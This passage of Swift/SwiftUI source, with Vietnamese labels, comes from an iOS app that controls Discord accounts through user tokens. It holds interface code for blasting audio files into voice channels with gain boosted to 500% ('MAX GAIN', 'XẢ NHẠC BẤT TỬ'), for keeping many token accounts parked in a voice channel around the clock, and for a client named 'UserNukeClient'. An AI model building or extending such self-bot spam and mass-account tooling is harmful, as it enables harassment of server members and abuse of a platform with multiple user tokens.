                        .foregroundStyle(.secondary)
                    Text("📭 Linh hồn hàng đợi đang trống rỗng.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                    Text("Bấm '➕ Nạp file' để chọn nhiều file .mp3, .m4a, .wav cùng lúc.")
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                }
                .frame(maxWidth: .infinity)
                .padding(.vertical, 16)
                .background(Color(UIColor.tertiarySystemBackground))
                .cornerRadius(10)
            } else {
                ScrollView {
                    LazyVStack(spacing: 6) {
                        ForEach(Array(musicStream.playlist.enumerated()), id: \.element.id) { index, item in
                            let isCurrent = (musicStream.currentTrackIndex == index)
                            Button {
                                musicStream.selectTrack(index: index)
                            } label: {
                                HStack(spacing: 10) {
                                    if isCurrent && musicStream.isPlaying {
                                        Text("▶️ [ĐANG XẢ]")
                                            .font(.caption2.bold())
                                            .foregroundColor(.red)
                                    } else {
                                        Text("⏳ #\(index + 1)")
                                            .font(.caption.bold())
                                            .foregroundColor(isCurrent ? .red : .secondary)
                                            .frame(width: 48, alignment: .leading)
                                    }

                                    VStack(alignment: .leading, spacing: 2) {
                                        Text(item.title)
                                            .font(.subheadline.bold())
                                            .foregroundColor(isCurrent ? .red : .primary)
                                            .lineLimit(1)
                                        HStack(spacing: 6) {
                                            if item.isPreset {
                                                Text("Pháp Bảo VIP")
                                                    .font(.caption2.bold())
                                                    .foregroundColor(.orange)
                                            }
                                            Text(item.durationFormatted)
                                                .font(.caption2)
                                                .foregroundColor(.secondary)
                                        }
                                    }

                                    Spacer()

                                    Button {
                                        musicStream.removeTrack(id: item.id)
                                    } label: {
                                        Image(systemName: "trash")
                                            .font(.caption)
                                            .foregroundColor(.secondary)
                                            .padding(6)
                                    }
                                }
                                .padding(.horizontal, 10)
                                .padding(.vertical, 8)
                                .background(isCurrent ? Color.red.opacity(0.1) : Color(UIColor.tertiarySystemBackground))
                                .cornerRadius(8)
                                .overlay(
                                    RoundedRectangle(cornerRadius: 8)
                                        .stroke(isCurrent ? Color.red.opacity(0.4) : Color.clear, lineWidth: 1)
                                )
                            }
                            .buttonStyle(.plain)
                        }
                    }
                }
                .frame(maxHeight: 220)
            }
        }
        .padding()
        .background(Color(UIColor.secondarySystemBackground))
        .cornerRadius(15)
    }

    // Card 4: Sát Chiêu Thực Địa & Cấu Hình Âm Thanh
    private var combatEffectsCard: some View {
        VStack(alignment: .leading, spacing: 14) {
            HStack {
                Image(systemName: "flame.fill").foregroundStyle(.red)
                Text("Sát Chiêu Chiến Đấu Thực Địa").font(.headline)
            }

            Toggle(isOn: $musicStream.isMaxMode) {
                VStack(alignment: .leading, spacing: 2) {
                    HStack(spacing: 4) {
                        Text("🔴")
                        Text("CHIẾN ĐẤU V9 TỐI THƯỢNG (MAX GAIN)").font(.subheadline.bold()).foregroundColor(.red)
                    }
                    Text("Khai mở cực hạn hỏa lực: EQ 80Hz + 3500Hz + Volume 2.5x vượt bậc!")
                        .font(.caption2).foregroundStyle(.secondary)
                }
            }

            Divider()

            Toggle(isOn: $musicStream.isCleanMode) {
                VStack(alignment: .leading, spacing: 2) {
                    HStack(spacing: 4) {
                        Text("🧹")
                        Text("LỌC ỒN CHỦ ĐỘNG (LỌC TẠP ÂM)").font(.subheadline.bold()).foregroundColor(.teal)
                    }
                    Text("Lọc tạp âm, chống rè nhiễu dải tần Highpass 150Hz & Lowpass 10kHz.")
                        .font(.caption2).foregroundStyle(.secondary)
                }
            }

            Divider()

            VStack(alignment: .leading, spacing: 6) {
                HStack {
                    Text("🔊 Âm Lượng (Volume):").font(.subheadline.bold())
                    Spacer()
                    Text("\(Int(musicStream.volume * 100))%")
                        .font(.subheadline.bold())
                        .foregroundColor(.red)
                }
                Slider(value: $musicStream.volume, in: 0.0...2.0, step: 0.05).tint(.red)
                HStack(spacing: 8) {
                    ForEach([0.5, 1.0, 1.5, 2.0], id: \.self) { v in
                        Button {
                            musicStream.volume = Float(v)
                        } label: {
                            Text(v == 2.0 ? "200% MAX" : "\(Int(v * 100))%")
                                .font(.caption.bold())
                                .padding(.horizontal, 8)
                                .padding(.vertical, 4)
                                .background(musicStream.volume == Float(v) ? Color.red : Color(UIColor.tertiarySystemBackground))
                                .foregroundColor(musicStream.volume == Float(v) ? .white : .primary)
                                .cornerRadius(6)
                        }
                    }
                }
            }

            Divider()

            VStack(alignment: .leading, spacing: 6) {
                HStack {
                    Text("🚀 Ép Xung Khuếch Đại (Boost):").font(.subheadline.bold())
                    Spacer()
                    Text("\(Int(musicStream.boostMultiplier * 100))%")
                        .font(.subheadline.bold())
                        .foregroundColor(.orange)
                }
                Slider(value: $musicStream.boostMultiplier, in: 1.0...5.0, step: 0.25).tint(.orange)
                HStack(spacing: 8) {
                    ForEach([1.0, 2.0, 3.0, 5.0], id: \.self) { b in
                        Button {
                            musicStream.boostMultiplier = Float(b)
                        } label: {
                            Text(b == 5.0 ? "500% CỰC HẠN" : "\(Int(b * 100))%")
                                .font(.caption.bold())
                                .padding(.horizontal, 8)
                                .padding(.vertical, 4)
                                .background(musicStream.boostMultiplier == Float(b) ? Color.orange : Color(UIColor.tertiarySystemBackground))
                                .foregroundColor(musicStream.boostMultiplier == Float(b) ? .white : .primary)
                                .cornerRadius(6)
                        }
                    }
                }
            }

            Divider()

            VStack(alignment: .leading, spacing: 6) {
                HStack {
                    Text("💣 Tăng Cường Âm Trầm (Bass):").font(.subheadline.bold())
                    Spacer()
                    Text("+\(Int(musicStream.bassAmount))")
                        .font(.subheadline.bold())
                        .foregroundColor(.purple)
                }
                Slider(value: $musicStream.bassAmount, in: 0...100, step: 5).tint(.purple)
                HStack(spacing: 8) {
                    ForEach([0, 25, 50, 100], id: \.self) { b in
                        Button {
                            musicStream.bassAmount = Float(b)
                        } label: {
                            Text(b == 0 ? "0 (Gốc)" : "+\(b)")
                                .font(.caption.bold())
                                .padding(.horizontal, 8)
                                .padding(.vertical, 4)
                                .background(musicStream.bassAmount == Float(b) ? Color.purple : Color(UIColor.tertiarySystemBackground))
                                .foregroundColor(musicStream.bassAmount == Float(b) ? .white : .primary)
                                .cornerRadius(6)
                        }
                    }
                }
            }

            Divider()

            VStack(alignment: .leading, spacing: 6) {
                Text("Chế độ âm thanh:").font(.subheadline)
                Picker("Chế độ", selection: $musicStream.audioFX) {
                    ForEach(SpamAudioFX.allCases) { fx in
                        Text(fx.rawValue).tag(fx)
                    }
                }
                .pickerStyle(.segmented)
            }

            Toggle(isOn: $musicStream.playLocalSpeaker) {
                VStack(alignment: .leading, spacing: 2) {
                    Label("Nghe loa ngoài điện thoại (Monitor)", systemImage: "speaker.badge.waveform.fill")
                        .font(.subheadline)
                    Text("Mặc định TẮT: Âm thanh xả trực tiếp vào Discord Voice, không phát ra điện thoại.")
                        .font(.caption2).foregroundStyle(.secondary)
                }
            }
        }
        .padding()
        .background(Color(UIColor.secondarySystemBackground))
        .cornerRadius(15)
    }

    // Card 5: Nút Bắt Đầu / Dừng Xuất Thủ
    private var mainActionCard: some View {
        Group {
            if musicStream.isPlaying {
                Button {
                    musicStream.stopSpam()
                } label: {
                    HStack {
                        Image(systemName: "stop.fill")
                        Text("⛩️  BẾ QUAN (THU HỒI PHÂN THÂN)")
                    }
                    .font(.headline.bold())
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding()
                    .background(Color.red)
                    .cornerRadius(12)
                }
            } else {
                Button {
                    musicStream.startSpam(app: app)
                } label: {
                    HStack {
                        Image(systemName: "flame.fill")
                        Text("⚡  XUẤT THỦ XẢ NHẠC BẤT TỬ")
                    }
                    .font(.headline.bold())
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding()
                    .background(
                        (musicStream.currentDecoder != nil)
                        ? LinearGradient(colors: [.red, Color(red: 0.8, green: 0.1, blue: 0.1), .orange], startPoint: .leading, endPoint: .trailing)
                        : LinearGradient(colors: [.gray], startPoint: .leading, endPoint: .trailing)
                    )
                    .cornerRadius(12)
                    .shadow(color: .red.opacity(0.4), radius: 8, y: 4)
                }
                .disabled(musicStream.currentDecoder == nil)
            }
        }
    }

    // Card 6: Nhật Ký Xuất Thủ Tiên Nghịch
    private var battleLogsCard: some View {
        Group {
            if !musicStream.logs.isEmpty {
                VStack(alignment: .leading, spacing: 8) {
                    HStack {
                        Image(systemName: "terminal.fill").foregroundStyle(.red)
                        Text("Nhật Ký Xuất Thủ Tiên Nghịch").font(.headline)
                        Spacer()
                        Button("Xóa") { musicStream.logs.removeAll() }
                            .font(.caption)
                    }

                    ScrollView {
                        LazyVStack(alignment: .leading, spacing: 4) {
                            ForEach(musicStream.logs) { log in
                                Text("[\(formatTime(log.timestamp))] \(log.message)")
                                    .font(.system(.caption2, design: .monospaced))
                                    .foregroundStyle(.secondary)
                            }
                        }
                    }
                    .frame(height: 120)
                }
                .padding()
                .background(Color(UIColor.secondarySystemBackground))
                .cornerRadius(15)
            }
        }
    }

    // MARK: - TREO ROOM SECTION (HANG VOICE 24/7)
    private var treoRoomSection: some View {
        VStack(spacing: 14) {
            // Card: Server & Channel
            VStack(alignment: .leading, spacing: 12) {
                HStack {
                    Image(systemName: "server.rack").foregroundStyle(.indigo)
                    Text("Server & Kênh Voice").font(.headline)
                    Spacer()
                    Button {
                        showGuildPicker = true
                    } label: {
                        Text(voiceRoom.selectedGuild == nil ? "Chọn Kênh" : "Đổi Kênh")
                            .font(.caption.bold())
                            .padding(.horizontal, 10)
                            .padding(.vertical, 5)
                            .background(Color.indigo.opacity(0.15))
                            .cornerRadius(8)
                    }
                }

                // Channel ID manual entry
                HStack(spacing: 8) {
                    TextField("Dán Channel ID treo...", text: $voiceRoom.targetChannelId)
                        .textFieldStyle(.plain)
                        .padding(10)
                        .background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(8)
                        .keyboardType(.numberPad)
                }

                if let g = voiceRoom.selectedGuild, let c = voiceRoom.selectedChannel {
                    HStack(spacing: 8) {
                        Image(systemName: "checkmark.circle.fill").foregroundStyle(.green)
                        Text("\(g.name) > \(c.displayName)").font(.subheadline.bold()).foregroundStyle(.green)
                    }
                    .padding(8)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.tertiarySystemBackground))
                    .cornerRadius(8)
                }
            }
            .padding()
            .background(Color(UIColor.secondarySystemBackground))
            .cornerRadius(15)

            // Card: Cấu hình treo
            VStack(alignment: .leading, spacing: 12) {
                HStack {
                    Image(systemName: "slider.horizontal.3").foregroundStyle(.indigo)
                    Text("Cấu Hình Treo").font(.headline)
                }

                Picker("Chế độ Token", selection: $voiceRoom.multiTokenMode) {
                    Text("Treo Cả Dàn (\(activeTokens.count))").tag(true)
                    Text("Chỉ 1 Token Chính").tag(false)
                }
                .pickerStyle(.segmented)

                Divider()

                HStack(spacing: 12) {
                    Toggle(isOn: Binding(
                        get: { voiceRoom.selfMute },
                        set: { on in
                            voiceRoom.updateToggles(mute: on, deaf: voiceRoom.selfDeaf, video: voiceRoom.selfVideo)
                        }
                    )) {
                        Label("Tắt Mic", systemImage: voiceRoom.selfMute ? "mic.slash.fill" : "mic.fill")
                            .font(.subheadline)
                    }

                    Divider().frame(height: 20)

                    Toggle(isOn: Binding(
                        get: { voiceRoom.selfDeaf },
                        set: { on in
                            voiceRoom.updateToggles(mute: voiceRoom.selfMute, deaf: on, video: voiceRoom.selfVideo)
                        }
                    )) {
                        Label("Điếc Tai", systemImage: voiceRoom.selfDeaf ? "headphones.slash" : "headphones")
                            .font(.subheadline)
                    }
                }

                Toggle(isOn: Binding(
                    get: { voiceRoom.selfVideo },
                    set: { on in
                        voiceRoom.updateToggles(mute: voiceRoom.selfMute, deaf: voiceRoom.selfDeaf, video: on)
                    }
                )) {
                    Label("Bật Camera / Video ảo", systemImage: "video.fill")
                        .font(.subheadline)
                }
            }
            .padding()
            .background(Color(UIColor.secondarySystemBackground))
            .cornerRadius(15)

            // Nút Bắt Đầu / Dừng Treo
            if voiceRoom.isRunning {
                VStack(spacing: 12) {
                    HStack {
                        Circle().fill(.green).frame(width: 12, height: 12)
                        Text("ĐANG TREO ROOM HOẠT ĐỘNG")
                            .font(.subheadline.bold())
                            .foregroundStyle(.green)
                        Spacer()
                        Text(voiceRoom.formatDuration(voiceRoom.elapsedSeconds))
                            .font(.system(.subheadline, design: .monospaced).bold())
                            .foregroundStyle(.primary)
                    }

                    HStack(spacing: 12) {
                        StatCard(
                            title: "Đã vào phòng",
                            value: "\(voiceRoom.sessions.filter { $0.isJoined }.count)/\(voiceRoom.sessions.count)",
                            color: .green
                        )
                        StatCard(
                            title: "Thời gian treo",
                            value: voiceRoom.formatDuration(voiceRoom.elapsedSeconds),
                            color: .indigo
                        )
                    }

                    Button {
                        voiceRoom.stopTreo()
                    } label: {
                        HStack {
                            Image(systemName: "stop.fill")
                            Text("RỜI PHÒNG / DỪNG TREO")
                        }
                        .font(.headline.bold())
                        .foregroundColor(.white)
                        .frame(maxWidth: .infinity)
                        .padding()
                        .background(Color.red)
                        .cornerRadius(12)
                    }
                }
                .padding()
                .background(Color(UIColor.secondarySystemBackground))
                .cornerRadius(15)
            } else {
                Button {
                    let channelId = !voiceRoom.targetChannelId.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
                        ? voiceRoom.targetChannelId.trimmingCharacters(in: .whitespacesAndNewlines)
                        : (voiceRoom.selectedChannel?.id ?? "")
                    guard !channelId.isEmpty else { return }

                    let tokensToUse = voiceRoom.multiTokenMode ? activeTokens : singleTokenList
                    guard !tokensToUse.isEmpty else { return }

                    Task {
                        var gid = voiceRoom.selectedGuild?.id
                        if gid == nil, let tok = tokensToUse.first?.token {
                            gid = await fetchGuildIdForChannel(token: tok, channelId: channelId)
                        }
                        guard let finalGid = gid else { return }
                        let cName = voiceRoom.selectedChannel?.displayName ?? channelId
                        voiceRoom.startTreo(guildId: finalGid, channelId: channelId, channelName: cName, tokens: tokensToUse)
                    }
                } label: {
                    HStack {
                        Image(systemName: "play.fill")
                        Text("BẮT ĐẦU TREO ROOM 24/7")
                    }
                    .font(.headline.bold())
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding()
                    .background(
                        (!voiceRoom.targetChannelId.isEmpty || voiceRoom.selectedChannel != nil) && !activeTokens.isEmpty
                        ? LinearGradient(colors: [.indigo, .purple], startPoint: .leading, endPoint: .trailing)
                        : LinearGradient(colors: [.gray], startPoint: .leading, endPoint: .trailing)
                    )
                    .cornerRadius(12)
                    .shadow(color: .indigo.opacity(0.3), radius: 8, y: 4)
                }
                .disabled((voiceRoom.targetChannelId.isEmpty && voiceRoom.selectedChannel == nil) || activeTokens.isEmpty)
            }

            // Tài khoản trong Voice
            if !voiceRoom.sessions.isEmpty {
                VStack(alignment: .leading, spacing: 10) {
                    HStack {
                        Image(systemName: "person.2.fill").foregroundStyle(.indigo)
                        Text("Tài Khoản Trong Voice (\(voiceRoom.sessions.count))").font(.headline)
                    }

                    ForEach(voiceRoom.sessions) { s in
                        HStack(spacing: 10) {
                            if let url = s.avatarURL {
                                AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                placeholder: { Circle().fill(.gray) }
                                .frame(width: 32, height: 32).clipShape(Circle())
                            } else {
                                Circle().fill(.gray.opacity(0.3)).frame(width: 32, height: 32)
                            }

                            VStack(alignment: .leading, spacing: 2) {
                                Text(s.username).font(.subheadline.bold())
                                Text(s.lastLog.isEmpty ? (s.isJoined ? "Đang trong phòng" : "Đang kết nối...") : s.lastLog)
                                    .font(.caption2).foregroundStyle(.secondary).lineLimit(1)
                            }

                            Spacer()

                            Circle()
                                .fill(s.isVoiceUDPReady ? Color.green : (s.isJoined ? Color.green.opacity(0.7) : (s.isConnected ? Color.yellow : Color.red)))
                                .frame(width: 10, height: 10)
                        }
                        .padding(8)
                        .background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(8)
                    }
                }
                .padding()
                .background(Color(UIColor.secondarySystemBackground))
                .cornerRadius(15)
            }

            // Nhật Ký Kết Nối
            if !voiceRoom.logs.isEmpty {
                VStack(alignment: .leading, spacing: 8) {
                    HStack {
                        Image(systemName: "terminal.fill").foregroundStyle(.indigo)
                        Text("Nhật Ký Kết Nối").font(.headline)
                        Spacer()
                        Button("Xóa") { voiceRoom.logs.removeAll() }
                            .font(.caption)
                    }

                    ScrollView {
                        LazyVStack(alignment: .leading, spacing: 4) {
                            ForEach(voiceRoom.logs) { log in
                                Text("[\(formatTime(log.timestamp))] \(log.message)")
                                    .font(.system(.caption2, design: .monospaced))
                                    .foregroundStyle(.secondary)
                            }
                        }
                    }
                    .frame(height: 120)
                }
                .padding()
                .background(Color(UIColor.secondarySystemBackground))
                .cornerRadius(15)
            }
        }
    }

    // MARK: - HELPERS
    private var activeTokens: [TokenInfo] {
        if !app.selectedTokenIds.isEmpty {
            return app.tokens.filter { app.selectedTokenIds.contains($0.id) }
        }
        if let at = app.activeToken { return [at] }
        return app.tokens
    }

    private var singleTokenList: [TokenInfo] {
        if let at = app.activeToken { return [at] }
        if let f = app.tokens.first { return [f] }
        return []
    }

    private func formatTime(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "HH:mm:ss"
        return df.string(from: d)
    }

    private func formatSeconds(_ sec: Double) -> String {
        let s = Int(sec)
        let m = s / 60
        let r = s % 60
        return String(format: "%02d:%02d", m, r)
    }
}

// MARK: - VOICE GUILD & CHANNEL PICKER SHEET
struct VoiceGuildPickerSheet: View {
    var isForSpam: Bool = false
    @EnvironmentObject var app: AppState
    @EnvironmentObject var voiceRoom: VoiceRoomManager
    @EnvironmentObject var musicStream: MusicStreamManager
    @Environment(\.dismiss) var dismiss

    @State private var search = ""
    @State private var selectedGuild: Guild? = nil
    @State private var channels: [Channel] = []
    @State private var isLoading = false

    var filteredGuilds: [Guild] {
        if search.isEmpty { return app.multiGuilds }
        return app.multiGuilds.filter { $0.name.localizedCaseInsensitiveContains(search) }
    }

    var body: some View {
        NavigationStack {
            Group {
                if let g = selectedGuild {
                    // Danh sách kênh Voice trong Server
                    List {
                        if isLoading {
                            HStack {
                                Spacer()
                                ProgressView("Đang tải danh sách Voice...")
                                Spacer()
                            }
                        } else if channels.isEmpty {
                            Text("Không tìm thấy kênh Voice nào trong Server này")
                                .font(.subheadline)
                                .foregroundStyle(.secondary)
                        } else {
                            ForEach(channels) { ch in
                                Button {
                                    if isForSpam {
                                        musicStream.selectedGuild = g
                                        musicStream.selectedChannel = ch
                                        musicStream.targetChannelId = ch.id
                                    } else {
                                        voiceRoom.selectedGuild = g
                                        voiceRoom.selectedChannel = ch
                                        voiceRoom.targetChannelId = ch.id
                                    }
                                    dismiss()
                                } label: {
                                    HStack {
                                        Image(systemName: "speaker.wave.2.fill").foregroundColor(.indigo)
                                        Text(ch.displayName).font(.subheadline.bold()).foregroundColor(.primary)
                                        Spacer()
                                        Image(systemName: "chevron.right").font(.caption).foregroundColor(.secondary)
                                    }
                                }
                            }
                        }
                    }
                    .navigationTitle(g.name)
                    .toolbar {
                        ToolbarItem(placement: .cancellationAction) {
                            Button("Đổi Server") { selectedGuild = nil; channels = [] }
                        }
                    }
                } else {
                    // Danh sách Server
                    List(filteredGuilds) { g in
                        Button {
                            selectedGuild = g
                            loadChannels(for: g)
                        } label: {
                            HStack(spacing: 12) {
                                if let icon = g.icon, !AppEndpoints.cdnIcons.isEmpty,
                                   let url = URL(string: "\(AppEndpoints.cdnIcons)/\(g.id)/\(icon).png?size=64") {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(.gray) }
                                    .frame(width: 36, height: 36).clipShape(Circle())
                                } else {
                                    Circle().fill(.gray.opacity(0.3)).frame(width: 36, height: 36)
                                        .overlay(Text(String(g.name.prefix(1))).font(.subheadline.bold()))
                                }
                                Text(g.name).font(.subheadline.bold()).foregroundStyle(.primary)
                                Spacer()
                                Image(systemName: "chevron.right").font(.caption).foregroundColor(.secondary)
                            }
                        }
                    }
                    .searchable(text: $search, prompt: "Tìm kiếm Server...")
                    .navigationTitle("Chọn Server")
                    .toolbar {
                        ToolbarItem(placement: .cancellationAction) {
                            Button("Đóng") { dismiss() }
                        }
                    }
                }
            }
            .navigationBarTitleDisplayMode(.inline)
        }
    }

    private func loadChannels(for g: Guild) {
        guard let tok = (musicStream.selectedToken ?? app.activeToken ?? app.tokens.first)?.token else { return }
        isLoading = true
        Task {
            do {
                let all = try await UserNukeClient(token: tok).getChannels(g.id)
                let vcs = all.filter { $0.type == 2 || $0.type == 13 }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
                await MainActor.run {
                    self.channels = vcs
                    self.isLoading = false
                }
            } catch {
                await MainActor.run {
                    self.channels = []
                    self.isLoading = false
                }
            }
        }
    }
}
